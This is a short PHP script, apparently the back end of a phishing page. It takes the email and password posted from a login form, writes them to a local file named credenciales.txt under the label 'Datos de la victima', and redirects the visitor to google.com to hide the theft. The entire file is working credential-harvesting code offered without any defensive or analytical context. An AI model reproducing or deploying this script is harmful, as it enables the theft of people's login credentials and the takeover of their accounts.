<?PHP
$email = $_POST["email"];
$contrasena = $_POST["pass"];
$texto = "Datos de la victima.\n Correo: $email y contrasena:  $contrasena";
echo "
<script language='JavaScript'>
location.href = \"https://www.google.com\";
</script>";

$file=fopen("credenciales.txt","a+") or exit("Unable to open file!");

   fwrite($file, $texto);


fclose($file);

?>